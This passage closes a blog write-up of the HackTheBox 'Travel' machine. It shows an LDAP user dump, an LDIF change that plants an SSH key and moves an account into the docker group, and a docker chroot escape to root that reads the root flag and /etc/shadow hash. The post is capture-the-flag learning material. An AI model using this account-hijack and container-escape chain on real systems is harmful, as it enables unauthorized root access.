</span></span><span class=line><span class=cl>objectClass: organizationalUnit
</span></span><span class=line><span class=cl>ou: workstations
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># linux, servers, travel.htb
</span></span><span class=line><span class=cl>dn: ou=linux,ou=servers,dc=travel,dc=htb
</span></span><span class=line><span class=cl>description: Linux Servers
</span></span><span class=line><span class=cl>objectClass: organizationalUnit
</span></span><span class=line><span class=cl>ou: linux
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># windows, servers, travel.htb
</span></span><span class=line><span class=cl>dn: ou=windows,ou=servers,dc=travel,dc=htb
</span></span><span class=line><span class=cl>description: Windows Servers
</span></span><span class=line><span class=cl>objectClass: organizationalUnit
</span></span><span class=line><span class=cl>ou: windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># users, linux, servers, travel.htb
</span></span><span class=line><span class=cl>dn: ou=users,ou=linux,ou=servers,dc=travel,dc=htb
</span></span><span class=line><span class=cl>description: Linux Users
</span></span><span class=line><span class=cl>objectClass: organizationalUnit
</span></span><span class=line><span class=cl>ou: users
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># groups, linux, servers, travel.htb
</span></span><span class=line><span class=cl>dn: ou=groups,ou=linux,ou=servers,dc=travel,dc=htb
</span></span><span class=line><span class=cl>description: Linux Groups
</span></span><span class=line><span class=cl>objectClass: organizationalUnit
</span></span><span class=line><span class=cl>ou: groups
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># jane, users, linux, servers, travel.htb
</span></span><span class=line><span class=cl>dn: uid=jane,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
</span></span><span class=line><span class=cl>uid: jane
</span></span><span class=line><span class=cl>cn: Jane Rodriguez
</span></span><span class=line><span class=cl>sn: Rodriguez
</span></span><span class=line><span class=cl>givenName: Jane
</span></span><span class=line><span class=cl>loginShell: /bin/bash
</span></span><span class=line><span class=cl>uidNumber: 5005
</span></span><span class=line><span class=cl>gidNumber: 5000
</span></span><span class=line><span class=cl>homeDirectory: /home/jane
</span></span><span class=line><span class=cl>objectClass: top
</span></span><span class=line><span class=cl>objectClass: person
</span></span><span class=line><span class=cl>objectClass: organizationalPerson
</span></span><span class=line><span class=cl>objectClass: inetOrgPerson
</span></span><span class=line><span class=cl>objectClass: posixAccount
</span></span><span class=line><span class=cl>objectClass: shadowAccount
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># brian, users, linux, servers, travel.htb
</span></span><span class=line><span class=cl>dn: uid=brian,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
</span></span><span class=line><span class=cl>uid: brian
</span></span><span class=line><span class=cl>cn: Brian Bell
</span></span><span class=line><span class=cl>sn: Bell
</span></span><span class=line><span class=cl>givenName: Brian
</span></span><span class=line><span class=cl>loginShell: /bin/bash
</span></span><span class=line><span class=cl>uidNumber: 5002
</span></span><span class=line><span class=cl>gidNumber: 5000
</span></span><span class=line><span class=cl>homeDirectory: /home/brian
</span></span><span class=line><span class=cl>objectClass: top
</span></span><span class=line><span class=cl>objectClass: person
</span></span><span class=line><span class=cl>objectClass: organizationalPerson
</span></span><span class=line><span class=cl>objectClass: inetOrgPerson
</span></span><span class=line><span class=cl>objectClass: posixAccount
</span></span><span class=line><span class=cl>objectClass: shadowAccount
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># frank, users, linux, servers, travel.htb
</span></span><span class=line><span class=cl>dn: uid=frank,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
</span></span><span class=line><span class=cl>uid: frank
</span></span><span class=line><span class=cl>cn: Frank Stewart
</span></span><span class=line><span class=cl>sn: Stewart
</span></span><span class=line><span class=cl>givenName: Frank
</span></span><span class=line><span class=cl>loginShell: /bin/bash
</span></span><span class=line><span class=cl>uidNumber: 5001
</span></span><span class=line><span class=cl>gidNumber: 5000
</span></span><span class=line><span class=cl>homeDirectory: /home/frank
</span></span><span class=line><span class=cl>objectClass: top
</span></span><span class=line><span class=cl>objectClass: person
</span></span><span class=line><span class=cl>objectClass: organizationalPerson
</span></span><span class=line><span class=cl>objectClass: inetOrgPerson
</span></span><span class=line><span class=cl>objectClass: posixAccount
</span></span><span class=line><span class=cl>objectClass: shadowAccount
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># jerry, users, linux, servers, travel.htb
</span></span><span class=line><span class=cl>dn: uid=jerry,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
</span></span><span class=line><span class=cl>uid: jerry
</span></span><span class=line><span class=cl>uidNumber: 5006
</span></span><span class=line><span class=cl>homeDirectory: /home/jerry
</span></span><span class=line><span class=cl>givenName: Jerry
</span></span><span class=line><span class=cl>gidNumber: 5000
</span></span><span class=line><span class=cl>sn: Morgan
</span></span><span class=line><span class=cl>cn: Jerry Morgan
</span></span><span class=line><span class=cl>objectClass: top
</span></span><span class=line><span class=cl>objectClass: person
</span></span><span class=line><span class=cl>objectClass: organizationalPerson
</span></span><span class=line><span class=cl>objectClass: inetOrgPerson
</span></span><span class=line><span class=cl>objectClass: posixAccount
</span></span><span class=line><span class=cl>objectClass: shadowAccount
</span></span><span class=line><span class=cl>loginShell: /bin/bash
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># lynik, users, linux, servers, travel.htb
</span></span><span class=line><span class=cl>dn: uid=lynik,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
</span></span><span class=line><span class=cl>uid: lynik
</span></span><span class=line><span class=cl>uidNumber: 5000
</span></span><span class=line><span class=cl>homeDirectory: /home/lynik
</span></span><span class=line><span class=cl>givenName: Lynik
</span></span><span class=line><span class=cl>gidNumber: 5000
</span></span><span class=line><span class=cl>sn: Schmidt
</span></span><span class=line><span class=cl>cn: Lynik Schmidt
</span></span><span class=line><span class=cl>objectClass: top
</span></span><span class=line><span class=cl>objectClass: person
</span></span><span class=line><span class=cl>objectClass: organizationalPerson
</span></span><span class=line><span class=cl>objectClass: inetOrgPerson
</span></span><span class=line><span class=cl>objectClass: posixAccount
</span></span><span class=line><span class=cl>objectClass: shadowAccount
</span></span><span class=line><span class=cl>loginShell: /bin/bash
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># edward, users, linux, servers, travel.htb
</span></span><span class=line><span class=cl>dn: uid=edward,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
</span></span><span class=line><span class=cl>uid: edward
</span></span><span class=line><span class=cl>uidNumber: 5009
</span></span><span class=line><span class=cl>homeDirectory: /home/edward
</span></span><span class=line><span class=cl>givenName: Edward
</span></span><span class=line><span class=cl>gidNumber: 5000
</span></span><span class=line><span class=cl>sn: Roberts
</span></span><span class=line><span class=cl>cn: Edward Roberts
</span></span><span class=line><span class=cl>objectClass: top
</span></span><span class=line><span class=cl>objectClass: person
</span></span><span class=line><span class=cl>objectClass: organizationalPerson
</span></span><span class=line><span class=cl>objectClass: inetOrgPerson
</span></span><span class=line><span class=cl>objectClass: posixAccount
</span></span><span class=line><span class=cl>objectClass: shadowAccount
</span></span><span class=line><span class=cl>loginShell: /bin/bash
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># eugene, users, linux, servers, travel.htb
</span></span><span class=line><span class=cl>dn: uid=eugene,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
</span></span><span class=line><span class=cl>uid: eugene
</span></span><span class=line><span class=cl>cn: Eugene Scott
</span></span><span class=line><span class=cl>sn: Scott
</span></span><span class=line><span class=cl>givenName: Eugene
</span></span><span class=line><span class=cl>loginShell: /bin/bash
</span></span><span class=line><span class=cl>uidNumber: 5008
</span></span><span class=line><span class=cl>gidNumber: 5000
</span></span><span class=line><span class=cl>homeDirectory: /home/eugene
</span></span><span class=line><span class=cl>objectClass: top
</span></span><span class=line><span class=cl>objectClass: person
</span></span><span class=line><span class=cl>objectClass: organizationalPerson
</span></span><span class=line><span class=cl>objectClass: inetOrgPerson
</span></span><span class=line><span class=cl>objectClass: posixAccount
</span></span><span class=line><span class=cl>objectClass: shadowAccount
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># gloria, users, linux, servers, travel.htb
</span></span><span class=line><span class=cl>dn: uid=gloria,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
</span></span><span class=line><span class=cl>uid: gloria
</span></span><span class=line><span class=cl>uidNumber: 5010
</span></span><span class=line><span class=cl>homeDirectory: /home/gloria
</span></span><span class=line><span class=cl>givenName: Gloria
</span></span><span class=line><span class=cl>gidNumber: 5000
</span></span><span class=line><span class=cl>sn: Wood
</span></span><span class=line><span class=cl>cn: Gloria Wood
</span></span><span class=line><span class=cl>objectClass: top
</span></span><span class=line><span class=cl>objectClass: person
</span></span><span class=line><span class=cl>objectClass: organizationalPerson
</span></span><span class=line><span class=cl>objectClass: inetOrgPerson
</span></span><span class=line><span class=cl>objectClass: posixAccount
</span></span><span class=line><span class=cl>objectClass: shadowAccount
</span></span><span class=line><span class=cl>loginShell: /bin/bash
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># johnny, users, linux, servers, travel.htb
</span></span><span class=line><span class=cl>dn: uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
</span></span><span class=line><span class=cl>uid: johnny
</span></span><span class=line><span class=cl>cn: Johnny Miller
</span></span><span class=line><span class=cl>sn: Miller
</span></span><span class=line><span class=cl>givenName: Johnny
</span></span><span class=line><span class=cl>loginShell: /bin/bash
</span></span><span class=line><span class=cl>uidNumber: 5004
</span></span><span class=line><span class=cl>gidNumber: 5000
</span></span><span class=line><span class=cl>homeDirectory: /home/johnny
</span></span><span class=line><span class=cl>objectClass: top
</span></span><span class=line><span class=cl>objectClass: person
</span></span><span class=line><span class=cl>objectClass: organizationalPerson
</span></span><span class=line><span class=cl>objectClass: inetOrgPerson
</span></span><span class=line><span class=cl>objectClass: posixAccount
</span></span><span class=line><span class=cl>objectClass: shadowAccount
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># louise, users, linux, servers, travel.htb
</span></span><span class=line><span class=cl>dn: uid=louise,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
</span></span><span class=line><span class=cl>uid: louise
</span></span><span class=line><span class=cl>cn: Louise Griffin
</span></span><span class=line><span class=cl>sn: Griffin
</span></span><span class=line><span class=cl>givenName: Louise
</span></span><span class=line><span class=cl>loginShell: /bin/bash
</span></span><span class=line><span class=cl>uidNumber: 5007
</span></span><span class=line><span class=cl>gidNumber: 5000
</span></span><span class=line><span class=cl>homeDirectory: /home/louise
</span></span><span class=line><span class=cl>objectClass: top
</span></span><span class=line><span class=cl>objectClass: person
</span></span><span class=line><span class=cl>objectClass: organizationalPerson
</span></span><span class=line><span class=cl>objectClass: inetOrgPerson
</span></span><span class=line><span class=cl>objectClass: posixAccount
</span></span><span class=line><span class=cl>objectClass: shadowAccount
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># christopher, users, linux, servers, travel.htb
</span></span><span class=line><span class=cl>dn: uid=christopher,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
</span></span><span class=line><span class=cl>uid: christopher
</span></span><span class=line><span class=cl>uidNumber: 5003
</span></span><span class=line><span class=cl>homeDirectory: /home/christopher
</span></span><span class=line><span class=cl>givenName: Christopher
</span></span><span class=line><span class=cl>gidNumber: 5000
</span></span><span class=line><span class=cl>sn: Ward
</span></span><span class=line><span class=cl>cn: Christopher Ward
</span></span><span class=line><span class=cl>objectClass: top
</span></span><span class=line><span class=cl>objectClass: person
</span></span><span class=line><span class=cl>objectClass: organizationalPerson
</span></span><span class=line><span class=cl>objectClass: inetOrgPerson
</span></span><span class=line><span class=cl>objectClass: posixAccount
</span></span><span class=line><span class=cl>objectClass: shadowAccount
</span></span><span class=line><span class=cl>loginShell: /bin/bash
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># domainusers, groups, linux, servers, travel.htb
</span></span><span class=line><span class=cl>dn: cn=domainusers,ou=groups,ou=linux,ou=servers,dc=travel,dc=htb
</span></span><span class=line><span class=cl>memberUid: frank
</span></span><span class=line><span class=cl>memberUid: brian
</span></span><span class=line><span class=cl>memberUid: christopher
</span></span><span class=line><span class=cl>memberUid: johnny
</span></span><span class=line><span class=cl>memberUid: julia
</span></span><span class=line><span class=cl>memberUid: jerry
</span></span><span class=line><span class=cl>memberUid: louise
</span></span><span class=line><span class=cl>memberUid: eugene
</span></span><span class=line><span class=cl>memberUid: edward
</span></span><span class=line><span class=cl>memberUid: gloria
</span></span><span class=line><span class=cl>memberUid: lynik
</span></span><span class=line><span class=cl>gidNumber: 5000
</span></span><span class=line><span class=cl>cn: domainusers
</span></span><span class=line><span class=cl>objectClass: top
</span></span><span class=line><span class=cl>objectClass: posixGroup
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># search result
</span></span><span class=line><span class=cl>search: 2
</span></span><span class=line><span class=cl>result: 0 Success
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># numResponses: 22
</span></span><span class=line><span class=cl># numEntries: 21
</span></span></code></pre></td></tr></table></div></div><p>By the way, since the hostname, base & bind dn are specified inside <code>.ldaprc</code> we
can enter <code>ldapsearch -x -w Theroadlesstraveled</code> instead of the full command.</p><p>It seems our account is LDAP admin so we can configure it.</p><p>Let&rsquo;s see interesting groups:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cat /etc/group | grep trvl
</span></span><span class=line><span class=cl>adm:x:4:syslog,trvl-admin
</span></span><span class=line><span class=cl>cdrom:x:24:trvl-admin
</span></span><span class=line><span class=cl>sudo:x:27:trvl-admin
</span></span><span class=line><span class=cl>dip:x:30:trvl-admin
</span></span><span class=line><span class=cl>plugdev:x:46:trvl-admin
</span></span><span class=line><span class=cl>lxd:x:116:trvl-admin
</span></span><span class=line><span class=cl>trvl-admin:x:1000:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ cat /etc/group | grep docker
</span></span><span class=line><span class=cl>docker:x:117:
</span></span></code></pre></td></tr></table></div></div><p>Then we can add a key to a user and change it&rsquo;s base groupe to docker & user to
trvl-admin (not required).</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>dn: uid=louise,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
</span></span><span class=line><span class=cl>changeType: modify
</span></span><span class=line><span class=cl>add: objectClass
</span></span><span class=line><span class=cl>objectClass: ldapPublicKey
</span></span><span class=line><span class=cl>-
</span></span><span class=line><span class=cl>add: sshPublicKey
</span></span><span class=line><span class=cl>sshPublicKey: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDC/yatK67NXLmgt1LepjDbW2b7lE6z7Y8aIlveOGb6Lp48w0X9qTYNtqe7tgXQCN0qbMlhARBekVewayh4XouStOoEz7jeT8v4vL6awy0XwrqA/asj/LNjDOjAVGBtOsnPn9qE4JXsxQLBGlxouETwrZSUh1FMQFSzO77FasFQO8k59XO9cgCYj/b+TjM+IV5S6uSZPlmchmeT3abJjBaE+JHZ3V9wpCcOZ8v/kMEL+2jW4Rc6R7ChuQeZmNbkZxOx+xiJIu/otpMwrLhApG8zQ3Gm2sCWa1Xg1PjzIga4TD11VHoPgaeqTPhML4Y+zx4WUv8zib3Fl3boYapqiHQy0BMM6knfnCCu+gpkurBtJOqr/4rnq2bL/akVWjjPs3SbKdluQiBp6L8ZJ9dLz2JTpV0TsEEelbnYXT0jY13iAU+iZTnAiJJL/suTFuk1jAvIO8sz1wc8oi0BXaITbaUpKQAnkREdR6rJItH/MO9R2GnPKPby9KshKcvn9eL+jBk= cyfun@penarch
</span></span><span class=line><span class=cl>-
</span></span><span class=line><span class=cl>replace: gidNumber
</span></span><span class=line><span class=cl>gidNumber: 117
</span></span><span class=line><span class=cl>-
</span></span><span class=line><span class=cl>replace: uidNumber
</span></span><span class=line><span class=cl>uidNumber: 1000
</span></span></code></pre></td></tr></table></div></div><p>Then we can connect via SSH because the SSHD config is the following:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cat /etc/ssh/sshd_config | grep -v &#39;#&#39;
</span></span><span class=line><span class=cl>Include /etc/ssh/sshd_config.d/*.conf
</span></span><span class=line><span class=cl>AuthorizedKeysCommand /usr/bin/sss_ssh_authorizedkeys
</span></span><span class=line><span class=cl>AuthorizedKeysCommandUser nobody
</span></span><span class=line><span class=cl>ChallengeResponseAuthentication no
</span></span><span class=line><span class=cl>UsePAM yes
</span></span><span class=line><span class=cl>X11Forwarding yes
</span></span><span class=line><span class=cl>PrintMotd no
</span></span><span class=line><span class=cl>AcceptEnv LANG LC_*
</span></span><span class=line><span class=cl>Subsystem sftp  /usr/lib/openssh/sftp-server
</span></span><span class=line><span class=cl>PasswordAuthentication no
</span></span><span class=line><span class=cl>Match User trvl-admin,lynik-admin
</span></span><span class=line><span class=cl>        PasswordAuthentication yes
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ssh -i ~/.ssh/id_rsa louise@travel.htb
</span></span><span class=line><span class=cl>trvl-admin@travel:/$ id
</span></span><span class=line><span class=cl>uid=1000(trvl-admin) gid=117(docker) groups=117(docker),5000(domainusers)
</span></span></code></pre></td></tr></table></div></div><p>Then let&rsquo;s see images available in docker:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>trvl-admin@travel:/$ docker images
</span></span><span class=line><span class=cl>REPOSITORY            TAG                 IMAGE ID            CREATED             SIZE
</span></span><span class=line><span class=cl>nginx                 latest              602e111c06b6        4 months ago        127MB
</span></span><span class=line><span class=cl>memcached             latest              ac4488374c89        4 months ago        82.3MB
</span></span><span class=line><span class=cl>blog                  latest              4225bf7c5157        4 months ago        981MB
</span></span><span class=line><span class=cl>ubuntu                18.04               4e5021d210f6        5 months ago        64.2MB
</span></span><span class=line><span class=cl>jwilder/nginx-proxy   alpine              a7a1c0b44c8a        7 months ago        54.6MB
</span></span><span class=line><span class=cl>osixia/openldap       latest              4c780dfa5f5e        11 months ago       275M
</span></span></code></pre></td></tr></table></div></div><p>Now that we are in the docker group it&rsquo;s easy pe thanks to <a href=https://gtfobins.github.io/gtfobins/docker/>gtfobins</a>. By the way we can search gtfobins
locally via two CLI tools: [gtfo][gtfo] and [gtfoblookup][gtfoblookup].</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ gtfo -b docker
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl># The resulting is a root shell.
</span></span><span class=line><span class=cl>Code:   docker run -v /:/mnt --rm -it alpine chroot /mnt sh
</span></span><span class=line><span class=cl>Type:   shell
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ gtfoblookup linux shell docker
</span></span><span class=line><span class=cl>docker:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    shell:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        Description: The resulting is a root shell.
</span></span><span class=line><span class=cl>        Code: docker run -v /:/mnt --rm -it alpine chroot /mnt sh
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>trvl-admin@travel:/$ docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt bash
</span></span><span class=line><span class=cl>root@d9ba81203eb5:/# id
</span></span><span class=line><span class=cl>uid=0(root) gid=0(root) groups=0(root)
</span></span><span class=line><span class=cl>root@d9ba81203eb5:/# cat /root/root.txt
</span></span><span class=line><span class=cl>189d55aa326f561c68c69a547ba2df0f
</span></span><span class=line><span class=cl>root@d9ba81203eb5:/# cat /etc/shadow | grep root
</span></span><span class=line><span class=cl>root:$6$p6a8fCN5/L4rm3FA$bwV15SC9j7QwaRwolnptinKydaRp9O3826E8QlFyrVmjxoaIvs6A.Aw7Z/VCRgGXu0cjLYfmznespEhTS8ZUe/:18397:0:99999:7:::
</span></span></code></pre></td></tr></table></div></div><p>:
[jtr]:https://www.openwall.com/john/
[gtfo]:https://github.com/mzfr/gtfo
[gtfoblookup]:https://github.com/nccgroup/GTFOBLookup</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/hard/>Hard</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>